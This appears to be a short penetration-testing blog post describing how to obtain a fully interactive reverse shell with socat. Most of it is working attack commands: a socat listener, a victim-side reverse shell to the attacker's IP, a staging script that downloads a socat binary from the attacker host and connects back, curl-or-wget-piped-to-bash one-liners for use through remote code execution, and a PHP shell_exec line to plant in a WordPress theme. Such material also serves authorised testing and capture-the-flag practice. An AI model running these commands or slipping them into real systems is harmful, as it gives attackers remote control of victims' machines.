---
title: Full TTY Shell with Socat
layout: post
author: hyprcub
tags: trick
---

# References

- [Upgrading Simple Shells to Fully Interactive TTYs](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)
- [Statically-linked binaries of various tools](https://github.com/andrew-d/static-binaries)

#  Introduction

This is a quick trick to get a full TTY reverse shell using [socat](http://www.dest-unreach.org/socat/) which is really an awesome tool. There's nothing new, it has already been described on [ropno's blog](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#tldr-cheatsheet) to some extent. However, I wanted to put it here as a reference, at least for the way I use it most of the time.

# Principles

On the attacker's machine (listening mode):
```bash
sudo socat file:`tty`,raw,echo=0 tcp-listen:443
```
On the victim's machine (sending mode):
```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:LHOST:443
```
where `LHOST` has to be replaced with attacker's IP.

# When you have some kind of RCE

1. Start your listener as above.
2. Serve a script file called `socat.sh` via HTTP, containing:
    ```bash
    #!/bin/sh

    LHOST=10.11.31.164 # change this
    LPORT=443 # change this
    DIR=/tmp # maybe also this

    # choose between curl or wget
    curl -s http://$LHOST/socat -o $DIR/socat
    #wget -q http://$LHOST/socat -O $DIR/socat
    chmod +x $DIR/socat
    $DIR/socat exec:'/bin/bash -li',pty,stderr,setsid,sigint,sane tcp:$LHOST:$LPORT
    ```
3. You also have to serve a static version of `socat` you'll find [there](https://github.com/andrew-d/static-binaries/tree/master/binaries).
4. Then, on the victim's machine, via the RCE you discovered:
    ```bash
    curl -s http://LHOST/socat.sh | bash
    ```
    or
    ```bash
    wget -q http://LHOST/socat.sh -O - | bash
    ```
    
In a Wordpress theme PHP file, it could looks like this:
```php
shell_exec("curl -s http://LHOST/socat.sh | bash");
```
